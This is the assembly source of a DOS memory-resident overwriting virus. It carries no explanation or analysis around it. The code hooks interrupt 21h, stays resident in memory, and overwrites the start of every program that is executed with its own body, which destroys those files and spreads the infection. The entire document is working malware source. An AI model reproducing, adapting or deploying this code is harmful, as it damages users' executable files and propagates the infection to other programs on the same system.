code		segment
	assume cs:code,ds:code
	org 100h
start:
	mov ax,offset iniz
	push ax
	ret
nuovoint21:
	cmp ah,4bh
	je cont
	jmp old_int
hh:	dw 0
infect: 		;ds:dx=filename
	mov ah,3dh
	mov al,2
	int 21h
	push cs
	pop ds
	mov word ptr hh,ax
	lea dx,finepr
	sub dx,100h
	push dx
	pop cx
	push ax
	pop bx
	mov ah,40h
	mov dx,100h
	int 21h
	mov bx,word ptr hh
	mov ah,3eh
	int 21h
	ret

cont:
	push ax
	push bx
	push cx
	push dx
	push ds

	call infect


	pop ds
	pop dx
	pop cx
	pop bx
	pop ax
old_int:
	db 0eah
l1:	db 0,0
l2:	db 0,0

iniz:
	mov ah,35h
	mov al,21h
	int 21h
	mov word ptr l1,bx
	mov word ptr l2,es
	push cs
	pop ds
	mov dx,offset nuovoint21
	mov ah,25h
	mov al,21h
	int 21h
	push cs
	pop es
	mov es,es:[2ch]
	mov ah,49h
	int 21h
	lea dx,finepr
	int 27h
	nop
	nop
	nop
finepr:	db 0

code		ends
	end start
